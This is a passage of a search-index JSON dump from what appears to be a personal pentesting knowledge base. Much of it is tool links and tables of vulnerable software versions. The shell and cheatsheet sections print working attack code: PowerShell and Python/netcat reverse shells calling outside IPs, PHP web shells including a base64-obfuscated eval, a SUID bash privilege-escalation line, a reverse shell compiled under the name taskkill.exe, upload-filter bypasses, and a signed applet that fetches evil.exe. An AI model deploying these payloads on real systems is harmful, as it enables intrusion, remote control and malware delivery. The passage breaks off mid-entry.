https://www.safer-networking.org/products/filealyzer/ WinDbg Toy scripts for playing with WinDbg JS API: https://github.com/hugsy/windbg_js_scripts Other HXD - Hex Editor: https://mh-nexus.de/en/hxd/","title":"Tools"},{"location":"reverse-engineering/windows/tools/#tools","text":"","title":"Tools"},{"location":"reverse-engineering/windows/tools/#collections","text":"A list of static analysis tools for Portable Executable (PE) files: https://www.peerlyst.com/posts/a-list-of-static-analysis-tools-for-portable-executable-pe-files-susan-parker?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post","title":"Collections"},{"location":"reverse-engineering/windows/tools/#libpeconv","text":"A library to load, manipulate, dump PE files. Github - https://github.com/hasherezade/libpeconv","title":"libpeconv"},{"location":"reverse-engineering/windows/tools/#filealyzer","text":"Helps you explore alternate data streams, #PE/#ELF data and anomalies, file signatures, EXIF data, MZ header, #OpenSBI, #PEiD, #VirusTotal, Android and iOS app (file) info, all in one neat UI. Home: https://www.safer-networking.org/products/filealyzer/","title":"filealyzer"},{"location":"reverse-engineering/windows/tools/#windbg","text":"Toy scripts for playing with WinDbg JS API: https://github.com/hugsy/windbg_js_scripts","title":"WinDbg"},{"location":"reverse-engineering/windows/tools/#other","text":"HXD - Hex Editor: https://mh-nexus.de/en/hxd/","title":"Other"},{"location":"reverse-engineering/windows/vba/","text":"VBA Tools Generate call graphs from VBA code - https://github.com/MalwareCantFly/Vba2Graph","title":"VBA"},{"location":"reverse-engineering/windows/vba/#vba","text":"","title":"VBA"},{"location":"reverse-engineering/windows/vba/#tools","text":"Generate call graphs from VBA code - https://github.com/MalwareCantFly/Vba2Graph","title":"Tools"},{"location":"reverse-engineering/windows/x-Defense/","text":"Defense Control Flow Guard Protects the execution flow from redirection - for example, from exploits that overwrite an address in the stack. Available for: Windows 8.1 and Windows 10 x86/x64 https://86hh.github.io/cfg.html","title":"Defense"},{"location":"reverse-engineering/windows/x-Defense/#defense","text":"","title":"Defense"},{"location":"reverse-engineering/windows/x-Defense/#control-flow-guard","text":"Protects the execution flow from redirection - for example, from exploits that overwrite an address in the stack. Available for: Windows 8.1 and Windows 10 x86/x64 https://86hh.github.io/cfg.html","title":"Control Flow Guard"},{"location":"rf-and-wireless/rfid_nfc/","text":"References New References Practical_Guide_To_Hacking_RFID_NFC: https://smartlockpicking.com/slides/Confidence_A_2018_Practical_Guide_To_Hacking_RFID_NFC.pdf ESP-RFID-Tool: https://github.com/rfidtool/ESP-RFID-Tool https://www.aliexpress.com/item/ESP-RFID-Tool/32850151497.html Intro to NFC Payment Relay Attacks: https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ Iceman is creating Proxmark3 / RFID / NFC Security related content: https://twitter.com/herrmann1001 https://www.patreon.com/iceman1001?utm_medium=social utm_source=twitter utm_campaign=creatorshare2","title":"Rfid nfc"},{"location":"rf-and-wireless/rfid_nfc/#references","text":"","title":"References"},{"location":"rf-and-wireless/rfid_nfc/#new-references","text":"Practical_Guide_To_Hacking_RFID_NFC: https://smartlockpicking.com/slides/Confidence_A_2018_Practical_Guide_To_Hacking_RFID_NFC.pdf ESP-RFID-Tool: https://github.com/rfidtool/ESP-RFID-Tool https://www.aliexpress.com/item/ESP-RFID-Tool/32850151497.html Intro to NFC Payment Relay Attacks: https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ Iceman is creating Proxmark3 / RFID / NFC Security related content: https://twitter.com/herrmann1001 https://www.patreon.com/iceman1001?utm_medium=social utm_source=twitter utm_campaign=creatorshare2","title":"New References"},{"location":"rf-and-wireless/rpi/","text":"RaspberryPi P4wnP1 P4wnP1 A.L.O.A. by MaMe82 is a framework which turns a Rapsberry Pi Zero W into a flexible, low-cost platform for pentesting, red teaming and physical engagements ... or into \"A Little Offensive Appliance\": https://github.com/mame82/P4wnP1_aloa Plug Play USB device emulation HIDScript Bluetooth WiFi Networking Configuration and Control via CLI, remotely if needed Configuration and Control via web client Automation RPI for TX https://github.com/F5OEO/rpitx https://www.rtl-sdr.com/using-an-rtl-sdr-and-rpitx-to-unlock-a-car-with-a-replay-attack/","title":"RaspberryPi"},{"location":"rf-and-wireless/rpi/#raspberrypi","text":"","title":"RaspberryPi"},{"location":"rf-and-wireless/rpi/#p4wnp1","text":"P4wnP1 A.L.O.A. by MaMe82 is a framework which turns a Rapsberry Pi Zero W into a flexible, low-cost platform for pentesting, red teaming and physical engagements ... or into \"A Little Offensive Appliance\": https://github.com/mame82/P4wnP1_aloa Plug Play USB device emulation HIDScript Bluetooth WiFi Networking Configuration and Control via CLI, remotely if needed Configuration and Control via web client Automation","title":"P4wnP1"},{"location":"rf-and-wireless/rpi/#rpi-for-tx","text":"https://github.com/F5OEO/rpitx https://www.rtl-sdr.com/using-an-rtl-sdr-and-rpitx-to-unlock-a-car-with-a-replay-attack/","title":"RPI for TX"},{"location":"rf-and-wireless/sdr/","text":"SDR Tools urh Universal Radio Hacker: investigate wireless protocols like a boss - hardware interfaces for common Software Defined Radios - easy demodulation of signals - assigning participants to keep overview of your data - customizable decodings to crack even sophisticated encodings like CC1101 data whitening - assign labels to reveal the logic of the protocol - fuzzing component to find security leaks - modulation support to inject the data back into the system - simulation environment to perform stateful attacks GitHub: https://github.com/jopohl/urh PDF Guide: https://github.com/jopohl/urh/releases/download/v2.0.0/userguide.pdf Video Guide: https://www.youtube.com/watch?v=kuubkTDAxwA index=1 list=PLlKjreY6G-1EKKBs9sucMdk8PwzcFuIPB Wiki: https://github.com/jopohl/urh/wiki rtl_433 Program to decode traffic from Devices that are broadcasting on 433.9 MHz like temperature sensors GitHub: https://github.com/merbanan/rtl_433 Blog Posts: https://www.rtl-sdr.com/tag/rtl_433/ RPi and RRDTool: https://raspberrypiandstuff.wordpress.com/2017/08/04/rtl_433-on-a-raspberry-pi-made-bulletproof/ gqrx Software defined radio receiver powered by GNU Radio and Qt. GitHub: https://github.com/csete/gqrx IMSI-catcher This program show you IMSI numbers of cellphones around you. GitHub: https://github.com/Oros42/IMSI-catcher AirplaneJS An SDR app written in JavaScript that picks up ADS-B radio signals from airplanes and plots them in real time on a map in your browser GitHub: https://github.com/watson/airplanejs srsLTE srsLTE is a free and open-source LTE software suite developed by SRS GitHub: https://github.com/srsLTE/srsLTE USB HID Security script handling packets coming in from GNURadio via ZMQ and doing some decoding - https://twitter.com/assortedhackery/status/1076886102466801664 GitHub: https://github.com/miek/milight/blob/master/packet_handler.py USB HID Keyboard: https://github.com/mame82/P4wnP1_aloa/blob/master/hid/keyboard_globals.go#L6 Logitech: https://twitter.com/mame82/status/1077191504412721152 Logitech Unifying After patches: https://twitter.com/mame82/status/1093859460102131717 https://threatpost.com/logitech-keystroke-injection-flaw/139928/ GreHack 2018: Trap Your Keyboard 101 - Marion Lafon: https://www.youtube.com/watch?v=bXMx6lt3Gz0 QSpectrumAnalyzer Spectrum analyzer for multiple SDR platforms (PyQtGraph based GUI for soapy_power, hackrf_sweep, rtl_power, rx_power and other backends) https://github.com/xmikos/qspectrumanalyzer https://twitter.com/YashinMehaboobe/status/1092150871360712704 Resources LoRa Reverse Engineering and AES EM Side-Channel Attacks using SDR: https://archive.fosdem.org/2018/schedule/event/sdr_lora_aes/attachments/slides/2357/export/events/attachments/sdr_lora_aes/slides/2357/LoRa_AES_Security_SDR_FOSDEM_2018.pdf https://www.youtube.com/watch?v=Q-0u87eFAm8 TALKS FROM THE 2018 GNU RADIO CONFERENCE: https://www.rtl-sdr.com/talks-from-the-2018-gnu-radio-conference/ Picking a Needle in a Haystack: Detecting Drones via Network Traffic Analysis: https://arxiv.org/pdf/1901.03535.pdf Listening in to a DECT Digital Cordless Phone with a HackRF: https://www.rtl-sdr.com/listening-in-to-a-dect-digital-cordless-phone-with-a-hackrf/ Building a Carbon Fibre Dual Band Yagi Antenna for Amateur Radio Satellites with 3D Printed Parts for 20\u20ac: https://www.rtl-sdr.com/building-a-carbon-fibre-dual-band-yagi-antenna-for-amateur-radio-satellites-with-3d-printed-parts-for-20e/ Eavesdropping on DECT6.0 Cordless Phones with a HackRF and GR-DECT2: https://www.rtl-sdr.com/youtube-tutorial-eavesdropping-on-dect6-0-cordless-phones-with-a-hackrf-and-gr-dect2/ Implementing your own mobile phone: https://twitter.com/G33KatWork/status/1078580869844140032 Breaking LTE on Layer Two: https://alter-attack.net/ PCILeech uses PCIe hardware devices to read and write from the target system memory: https://github.com/ufrisk/pcileech","title":"SDR"},{"location":"rf-and-wireless/sdr/#sdr","text":"","title":"SDR"},{"location":"rf-and-wireless/sdr/#tools","text":"","title":"Tools"},{"location":"rf-and-wireless/sdr/#urh","text":"Universal Radio Hacker: investigate wireless protocols like a boss - hardware interfaces for common Software Defined Radios - easy demodulation of signals - assigning participants to keep overview of your data - customizable decodings to crack even sophisticated encodings like CC1101 data whitening - assign labels to reveal the logic of the protocol - fuzzing component to find security leaks - modulation support to inject the data back into the system - simulation environment to perform stateful attacks GitHub: https://github.com/jopohl/urh PDF Guide: https://github.com/jopohl/urh/releases/download/v2.0.0/userguide.pdf Video Guide: https://www.youtube.com/watch?v=kuubkTDAxwA index=1 list=PLlKjreY6G-1EKKBs9sucMdk8PwzcFuIPB Wiki: https://github.com/jopohl/urh/wiki","title":"urh"},{"location":"rf-and-wireless/sdr/#rtl_433","text":"Program to decode traffic from Devices that are broadcasting on 433.9 MHz like temperature sensors GitHub: https://github.com/merbanan/rtl_433 Blog Posts: https://www.rtl-sdr.com/tag/rtl_433/ RPi and RRDTool: https://raspberrypiandstuff.wordpress.com/2017/08/04/rtl_433-on-a-raspberry-pi-made-bulletproof/","title":"rtl_433"},{"location":"rf-and-wireless/sdr/#gqrx","text":"Software defined radio receiver powered by GNU Radio and Qt. GitHub: https://github.com/csete/gqrx","title":"gqrx"},{"location":"rf-and-wireless/sdr/#imsi-catcher","text":"This program show you IMSI numbers of cellphones around you. GitHub: https://github.com/Oros42/IMSI-catcher","title":"IMSI-catcher"},{"location":"rf-and-wireless/sdr/#airplanejs","text":"An SDR app written in JavaScript that picks up ADS-B radio signals from airplanes and plots them in real time on a map in your browser GitHub: https://github.com/watson/airplanejs","title":"AirplaneJS"},{"location":"rf-and-wireless/sdr/#srslte","text":"srsLTE is a free and open-source LTE software suite developed by SRS GitHub: https://github.com/srsLTE/srsLTE","title":"srsLTE"},{"location":"rf-and-wireless/sdr/#usb-hid-security","text":"script handling packets coming in from GNURadio via ZMQ and doing some decoding - https://twitter.com/assortedhackery/status/1076886102466801664 GitHub: https://github.com/miek/milight/blob/master/packet_handler.py USB HID Keyboard: https://github.com/mame82/P4wnP1_aloa/blob/master/hid/keyboard_globals.go#L6 Logitech: https://twitter.com/mame82/status/1077191504412721152 Logitech Unifying After patches: https://twitter.com/mame82/status/1093859460102131717 https://threatpost.com/logitech-keystroke-injection-flaw/139928/ GreHack 2018: Trap Your Keyboard 101 - Marion Lafon: https://www.youtube.com/watch?v=bXMx6lt3Gz0","title":"USB HID Security"},{"location":"rf-and-wireless/sdr/#qspectrumanalyzer","text":"Spectrum analyzer for multiple SDR platforms (PyQtGraph based GUI for soapy_power, hackrf_sweep, rtl_power, rx_power and other backends) https://github.com/xmikos/qspectrumanalyzer https://twitter.com/YashinMehaboobe/status/1092150871360712704","title":"QSpectrumAnalyzer"},{"location":"rf-and-wireless/sdr/#resources","text":"LoRa Reverse Engineering and AES EM Side-Channel Attacks using SDR: https://archive.fosdem.org/2018/schedule/event/sdr_lora_aes/attachments/slides/2357/export/events/attachments/sdr_lora_aes/slides/2357/LoRa_AES_Security_SDR_FOSDEM_2018.pdf https://www.youtube.com/watch?v=Q-0u87eFAm8 TALKS FROM THE 2018 GNU RADIO CONFERENCE: https://www.rtl-sdr.com/talks-from-the-2018-gnu-radio-conference/ Picking a Needle in a Haystack: Detecting Drones via Network Traffic Analysis: https://arxiv.org/pdf/1901.03535.pdf Listening in to a DECT Digital Cordless Phone with a HackRF: https://www.rtl-sdr.com/listening-in-to-a-dect-digital-cordless-phone-with-a-hackrf/ Building a Carbon Fibre Dual Band Yagi Antenna for Amateur Radio Satellites with 3D Printed Parts for 20\u20ac: https://www.rtl-sdr.com/building-a-carbon-fibre-dual-band-yagi-antenna-for-amateur-radio-satellites-with-3d-printed-parts-for-20e/ Eavesdropping on DECT6.0 Cordless Phones with a HackRF and GR-DECT2: https://www.rtl-sdr.com/youtube-tutorial-eavesdropping-on-dect6-0-cordless-phones-with-a-hackrf-and-gr-dect2/ Implementing your own mobile phone: https://twitter.com/G33KatWork/status/1078580869844140032 Breaking LTE on Layer Two: https://alter-attack.net/ PCILeech uses PCIe hardware devices to read and write from the target system memory: https://github.com/ufrisk/pcileech","title":"Resources"},{"location":"shellcoding/powershell/","text":"Reverse Shell powercat -l -v -p 4444 -t 1000 powershell -e encoded-payload Payload: $client = New-Object System.Net.Sockets.TCPClient( 10.10.10.10 ,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + PS + (pwd).Path + ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Shortened Payload: #$sm=(New-Object Net.Sockets.TCPClient( 192.168.254.1 ,55555)).GetStream();[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2 1));$sm.Write($st,0,$st.Length)} http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html TCP / UDP / WMI Shells: https://github.com/samratashok/nishang/tree/master/Shells","title":"Reverse Shell"},{"location":"shellcoding/powershell/#reverse-shell","text":"powercat -l -v -p 4444 -t 1000 powershell -e encoded-payload Payload: $client = New-Object System.Net.Sockets.TCPClient( 10.10.10.10 ,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + PS + (pwd).Path + ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Shortened Payload: #$sm=(New-Object Net.Sockets.TCPClient( 192.168.254.1 ,55555)).GetStream();[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2 1));$sm.Write($st,0,$st.Length)} http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html","title":"Reverse Shell"},{"location":"shellcoding/powershell/#tcp-udp-wmi-shells","text":"https://github.com/samratashok/nishang/tree/master/Shells","title":"TCP / UDP / WMI Shells:"},{"location":"shellcoding/x86/","text":"Memorize the 8086 opcodes https://mobile.twitter.com/nocsi_/status/440358188492148736","title":"Memorize the 8086 opcodes"},{"location":"shellcoding/x86/#memorize-the-8086-opcodes","text":"https://mobile.twitter.com/nocsi_/status/440358188492148736","title":"Memorize the 8086 opcodes"},{"location":"shells/cpp/","text":"C++ Prometheus - simple C++ TCP reverse shell: https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp apt-get install g++-mingw-w64 i686-w64-mingw32-g++ prometheus.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc","title":"C++"},{"location":"shells/cpp/#c","text":"Prometheus - simple C++ TCP reverse shell: https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp apt-get install g++-mingw-w64 i686-w64-mingw32-g++ prometheus.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc","title":"C++"},{"location":"shells/icmp/","text":"ICMP Shells Disable ICMP replies: sysctl -w net.ipv4.icmp_echo_ignore_all=1 Listener/Server - https://github.com/inquisb/icmpsh Sender/Client - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1","title":"ICMP Shells"},{"location":"shells/icmp/#icmp-shells","text":"Disable ICMP replies: sysctl -w net.ipv4.icmp_echo_ignore_all=1 Listener/Server - https://github.com/inquisb/icmpsh Sender/Client - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1","title":"ICMP Shells"},{"location":"shells/java/","text":"Java https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp","title":"Java"},{"location":"shells/java/#java","text":"https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp","title":"Java"},{"location":"shells/linux/","text":"Linux Making SUIG SGID copy of bash /bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom /tmp/tom -p","title":"Linux"},{"location":"shells/linux/#linux","text":"","title":"Linux"},{"location":"shells/linux/#making-suig-sgid-copy-of-bash","text":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom /tmp/tom -p","title":"Making SUIG SGID copy of bash"},{"location":"shells/php/","text":"PHP Simple 'cmd' exec echo system($_GET['c']); echo exec($_GET['c']); Base64 encoded: eval(base64_decode('ZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7')); With if if (isset($_GET[ c ])) { echo system($_GET['c']); } External References Invoke-PowerShellTcpOneLine.ps1: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1","title":"PHP"},{"location":"shells/php/#php","text":"","title":"PHP"},{"location":"shells/php/#simple-cmd-exec","text":"echo system($_GET['c']); echo exec($_GET['c']);","title":"Simple 'cmd' exec"},{"location":"shells/php/#base64-encoded","text":"eval(base64_decode('ZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7'));","title":"Base64 encoded:"},{"location":"shells/php/#with-if","text":"if (isset($_GET[ c ])) { echo system($_GET['c']); }","title":"With if"},{"location":"shells/php/#external-references","text":"Invoke-PowerShellTcpOneLine.ps1: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1","title":"External References"},{"location":"shells/python/","text":"UDP import os;\u200b os.popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc -u LAB IP PORT /tmp/f \").read()\u200b \u200b","title":"Python"},{"location":"shells/python/#udp","text":"import os;\u200b os.popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc -u LAB IP PORT /tmp/f \").read()\u200b \u200b","title":"UDP"},{"location":"steganography/tools/","text":"Tools Images StegHide Extract steghide extract -p password -sf input .jpg Audio Sonic Visualiser\u200b - viewing and analysing the contents of music audio files: https://www.sonicvisualiser.org/","title":"Tools"},{"location":"steganography/tools/#tools","text":"","title":"Tools"},{"location":"steganography/tools/#images","text":"","title":"Images"},{"location":"steganography/tools/#steghide","text":"Extract steghide extract -p password -sf input .jpg","title":"StegHide"},{"location":"steganography/tools/#audio","text":"Sonic Visualiser\u200b - viewing and analysing the contents of music audio files: https://www.sonicvisualiser.org/","title":"Audio"},{"location":"theoretical/pentesting/","text":"Pentesting Process NDA Scoping Call https://www.dashe.com/blog/training-development/questions-learning-development-engagement/ Statement of Work (SOW) Passive Recon Active Scanning Target Enumeration Vulnerability Identification Vulnerability Exploitation Project Documentation","title":"Pentesting Process"},{"location":"theoretical/pentesting/#pentesting-process","text":"","title":"Pentesting Process"},{"location":"theoretical/pentesting/#nda","text":"","title":"NDA"},{"location":"theoretical/pentesting/#scoping-call","text":"https://www.dashe.com/blog/training-development/questions-learning-development-engagement/","title":"Scoping Call"},{"location":"theoretical/pentesting/#statement-of-work-sow","text":"","title":"Statement of Work (SOW)"},{"location":"theoretical/pentesting/#passive-recon","text":"","title":"Passive Recon"},{"location":"theoretical/pentesting/#active-scanning","text":"","title":"Active Scanning"},{"location":"theoretical/pentesting/#target-enumeration","text":"","title":"Target Enumeration"},{"location":"theoretical/pentesting/#vulnerability-identification","text":"","title":"Vulnerability Identification"},{"location":"theoretical/pentesting/#vulnerability-exploitation","text":"","title":"Vulnerability Exploitation"},{"location":"theoretical/pentesting/#project-documentation","text":"","title":"Project Documentation"},{"location":"vulnerable/desktop/","text":"Vulnerable Desktop Applications Software Version Vulnerability References Msf Chkrootkit 0.49 Prev Esc exploit-db Mozilla Firefox 45.0 RCE exploit-db Uncategorized Vsftpd 2.3.4 - does have a built-in backdoor Zervit 0.4 \u2013 Installation process from the book is still valid. SLMail \u2013 Installation process from the book is still valid. 3Com TFTP 2.0.1 \u2013 Installation process from the book is still valid. XAMPP 1.7.2 \u2013 Found at https://www.exploit-db.com/exploits/10391/. Acrobat Reader version 8.1.2 \u2013 Found at ftp://ftp.adobe.com/pub/adobe/reader/win/8.x/8.1.2/enu/AdbeRdr812_en_US.exe Java 7 Update 6 JRE \u2013 Found at http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html WarFTP 1.65 \u2013 Installation process from the book is still valid. Winamp 5.5 \u2013 Found at http://www.filehorse.com/download-winamp/4137/download/.","title":"Vulnerable Desktop Applications"},{"location":"vulnerable/desktop/#vulnerable-desktop-applications","text":"Software Version Vulnerability References Msf Chkrootkit 0.49 Prev Esc exploit-db Mozilla Firefox 45.0 RCE exploit-db","title":"Vulnerable Desktop Applications"},{"location":"vulnerable/desktop/#uncategorized","text":"Vsftpd 2.3.4 - does have a built-in backdoor Zervit 0.4 \u2013 Installation process from the book is still valid. SLMail \u2013 Installation process from the book is still valid. 3Com TFTP 2.0.1 \u2013 Installation process from the book is still valid. XAMPP 1.7.2 \u2013 Found at https://www.exploit-db.com/exploits/10391/. Acrobat Reader version 8.1.2 \u2013 Found at ftp://ftp.adobe.com/pub/adobe/reader/win/8.x/8.1.2/enu/AdbeRdr812_en_US.exe Java 7 Update 6 JRE \u2013 Found at http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html WarFTP 1.65 \u2013 Installation process from the book is still valid. Winamp 5.5 \u2013 Found at http://www.filehorse.com/download-winamp/4137/download/.","title":"Uncategorized"},{"location":"vulnerable/server/","text":"Vulnerable Server Applications Software Version CVE Vulnerability References Msf HttpFileServer 2.3x before 2.3c CVE-2014-6287 RCE exploit-db exploit/windows/http/rejetto_hfs_exec AChat 0.150 beta7 Buffer Overflow exploit-db exploit/windows/misc/achat_bof Apache James 2.3.2 RCE exploit-db htb_solidstate Elastix 2.2.0 LFI exploit-db ColdFusion 8.0.1 CVE-2009-2265 Arbitrary file upload arrexel exploit/windows/http/coldfusion_fckeditor Xdebug RCE xdebug-shell xdebug-rce IRCD 3.2.8.1 CVE-2010-2075 RCE exploit-db exploit/unix/irc/unreal_ircd_3281_backdoor Haraka SMTP 2.8.9 RCE exploit-db Zabbix 2.2 3.0.3 RCE exploit-db CouchDB 2.1.0 CVE-2017-12636 RCE exploit-db ref PlaySMS 1.4 RCE exploit-db ImageMagick 6.9.3-9 released 2016-04-30 CVE-2016\u20133714 RCE https://imagetragick.com/ dompdf 0.6.0 LFI exploit-db","title":"Vulnerable Server Applications"},{"location":"vulnerable/server/#vulnerable-server-applications","text":"Software Version CVE Vulnerability References Msf HttpFileServer 2.3x before 2.3c CVE-2014-6287 RCE exploit-db exploit/windows/http/rejetto_hfs_exec AChat 0.150 beta7 Buffer Overflow exploit-db exploit/windows/misc/achat_bof Apache James 2.3.2 RCE exploit-db htb_solidstate Elastix 2.2.0 LFI exploit-db ColdFusion 8.0.1 CVE-2009-2265 Arbitrary file upload arrexel exploit/windows/http/coldfusion_fckeditor Xdebug RCE xdebug-shell xdebug-rce IRCD 3.2.8.1 CVE-2010-2075 RCE exploit-db exploit/unix/irc/unreal_ircd_3281_backdoor Haraka SMTP 2.8.9 RCE exploit-db Zabbix 2.2 3.0.3 RCE exploit-db CouchDB 2.1.0 CVE-2017-12636 RCE exploit-db ref PlaySMS 1.4 RCE exploit-db ImageMagick 6.9.3-9 released 2016-04-30 CVE-2016\u20133714 RCE https://imagetragick.com/ dompdf 0.6.0 LFI exploit-db","title":"Vulnerable Server Applications"},{"location":"vulnerable/web/","text":"Vulnerable Web Applications Software Version Vulnerability References Msf Pfsense = 2.2.6 Command Injection exploit-db Pfsense 2.1.4 Command Injection exploit-db Drupal 7.x RCE exploit-db October CMS 1.0.412 RCE, PHP object injection exploit-db NibbleBlog 0 Usernames /nibbleblog/content/private/users.xml Apache Struts 2 2.3.x before 2.3.32 2.5.x before 2.5.10.1 RCE CVE-2017-5638 https://github.com/mazen160/struts-pwn PHPLiteAdmin 1.9.2 RCE exploit-db \u200b Rename Database\u200b page show the full path Pfsense issues PfSense Vulnerabilities Part 2: Command Injection - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/ PfSense Vulnerabilities Part 3: Local File Inclusion - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-3-local-file-inclusion/ PfSense Vulnerabilities Part 4: Directory Traversal - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-4-directory-traversal/","title":"Vulnerable Web Applications"},{"location":"vulnerable/web/#vulnerable-web-applications","text":"Software Version Vulnerability References Msf Pfsense = 2.2.6 Command Injection exploit-db Pfsense 2.1.4 Command Injection exploit-db Drupal 7.x RCE exploit-db October CMS 1.0.412 RCE, PHP object injection exploit-db NibbleBlog 0 Usernames /nibbleblog/content/private/users.xml Apache Struts 2 2.3.x before 2.3.32 2.5.x before 2.5.10.1 RCE CVE-2017-5638 https://github.com/mazen160/struts-pwn PHPLiteAdmin 1.9.2 RCE exploit-db \u200b Rename Database\u200b page show the full path","title":"Vulnerable Web Applications"},{"location":"vulnerable/web/#pfsense-issues","text":"PfSense Vulnerabilities Part 2: Command Injection - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/ PfSense Vulnerabilities Part 3: Local File Inclusion - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-3-local-file-inclusion/ PfSense Vulnerabilities Part 4: Directory Traversal - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-4-directory-traversal/","title":"Pfsense issues"},{"location":"web/0-cheatsheet/","text":"Cheatsheet File Upload Filename Suffixes example.php% filename= shell.php%00.jpg Creating GIF Put GIF89a; \u200b as the first line in the file and save the file with a \u200b .gif \u200b extension Bypass Validation File name validation: valid.txt with valid.txt.php Applet root@kali:~# javac Java.java root@kali:~# echo \u201cPermissions: all-\u00ad\u2010permissions\u201d /root/manifest.txt root@kali:~# jar cvf Java.jar Java.class added manifest adding: Java.class(in = 1233) (out= 709)(deflated 42%) root@kali:~# keytool -\u00ad\u2010genkey -\u00ad\u2010alias signapplet -\u00ad\u2010keystore mykeystore -\u00ad\u2010keypass mykeypass -\u00ad\u2010storepass password123 root@kali:~# jarsigner -\u00ad\u2010keystore mykeystore -\u00ad\u2010storepass password123 -\u00ad\u2010keypass mykeypass -\u00ad\u2010signedjar SignedJava.jar Java.jar signapplet root@kali:~# echo ' applet width= 1 height= 1 id= Java Secure code= Java.class archive= SignedJava.jar param name= 1 value= http://192.168.10.5:80/evil.exe /applet ' /var/www/java.html","title":"Cheatsheet"},{"location":"web/0-cheatsheet/#cheatsheet","text":"","title":"Cheatsheet"},{"location":"web/0-cheatsheet/#file-upload","text":"","title":"File Upload"},{"location":"web/0-cheatsheet/#filename-suffixes","text":"example.php% filename= shell.php%00.jpg","title":"Filename Suffixes"},{"location":"web/0-cheatsheet/#creating-gif","text":"Put GIF89a; \u200b as the first line in the file and save the file with a \u200b .gif \u200b extension","title":"Creating GIF"},{"location":"web/0-cheatsheet/#bypass-validation","text":"File name validation: valid.txt with valid.txt.php","title":"Bypass Validation"},{"location":"web/0-cheatsheet/#applet","text":"root@kali:~# javac Java.java root@kali:~# echo \u201cPermissions: all-\u00ad\u2010permissions\u201d /root/manifest.txt root@kali:~# jar cvf Java.jar Java.class added manifest adding: Java.class(in = 1233) (out= 709)(deflated 42%) root@kali:~# keytool -\u00ad\u2010genkey -\u00ad\u2010alias signapplet -\u00ad\u2010keystore mykeystore -\u00ad\u2010keypass mykeypass -\u00ad\u2010storepass password123 root@kali:~# jarsigner -\u00ad\u2010keystore mykeystore -\u00ad\u2010storepass password123 -\u00ad\u2010keypass mykeypass -\u00ad\u2010signedjar SignedJava.jar Java.jar signapplet root@kali:~# echo ' applet width= 1 height= 1 id= Java Secure code= Java.class archive= SignedJava.jar param name= 1 value= http://192.168.10.5:80/evil.exe /applet ' /var/www/java.html","title":"Applet"},{"location":"web/client-side/","text":"Client Side Attacks References Browser Exploitation LinkedIn browser plugin enumeration: https://github.com/dandrews/nefarious-linkedin Browser, VMEscape and Kernel Exploitation (Chrome/Safari): https://github.com/vngkv123/aSiagaming","title":"Client Side Attacks"},{"location":"web/client-side/#client-side-attacks","text":"","title":"Client Side Attacks"},{"location":"web/client-side/#references","text":"","title":"References"},{"location":"web/client-side/#browser-exploitation","text":"LinkedIn browser plugin enumeration: https://github.com/dandrews/nefarious-linkedin Browser, VMEscape and Kernel 